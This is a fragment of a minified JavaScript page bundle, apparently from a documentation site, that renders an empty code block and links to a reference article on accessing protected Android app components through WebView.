<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>参考文档: <a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview" target="_blank" rel="noreferrer">Android: Access to app protected components</a></p>`,46),e=[o];function t(r,c,D,F,i,y){return n(),a("div",null,e)}const d=s(p,[["render",t]]);export{C as __pageData,d as default};
